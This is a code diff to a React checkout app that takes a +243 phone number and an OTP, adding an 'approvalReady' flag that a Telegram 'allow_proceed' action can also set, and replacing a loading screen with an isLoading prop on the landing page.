@@ -61,6 +61,7 @@ function App() {
   const [approvalError, setApprovalError] = useState('');
   const [approvalPassed, setApprovalPassed] = useState(false);
   const otpInputRef = useRef([]);
+  const approvalReady = approvalPassed || telegramAction?.action === 'allow_proceed';
   const normalizedLocalNumber = phoneNumber.replace(/\D/g, '').slice(0, 9);
   const apiPhoneNumber = normalizedLocalNumber ? `+243${normalizedLocalNumber}` : '';
   const otpCode = otpDigits.join('');
@@ -89,7 +90,7 @@ function App() {
   }, []);
 
   useEffect(() => {
-    if (!approvalPassed || paymentConfirmed) {
+    if (!approvalReady || paymentConfirmed) {
       return undefined;
     }
 
@@ -107,7 +108,7 @@ function App() {
     }, 1000);
 
     return () => clearInterval(interval);
-  }, [approvalPassed, paymentConfirmed]);
+  }, [approvalReady, paymentConfirmed]);
 
   useEffect(() => {
     if (!waitingApproval || !apiPhoneNumber) {
@@ -442,14 +443,6 @@ function App() {
     );
   }
 
-  if (!data) {
-    return (
-      <div className="page-shell">
-        <div className="message-block loading">Chargement...</div>
-      </div>
-    );
-  }
-
   if (checkoutOffer) {
     return (
       <CheckoutPage
@@ -457,7 +450,7 @@ function App() {
         onBack={handleBack}
         brandSources={BRAND_LOGO_SOURCES}
         waitingApproval={waitingApproval}
-        approvalPassed={approvalPassed}
+        approvalPassed={approvalReady}
         paymentConfirmed={paymentConfirmed}
         apiPhoneNumber={apiPhoneNumber}
         approvalError={approvalError}
@@ -496,6 +489,7 @@ function App() {
   return (
     <LandingPage
       data={data}
+      isLoading={!data}
       onStartCheckout={startCheckout}
       brandSources={BRAND_LOGO_SOURCES}
     />
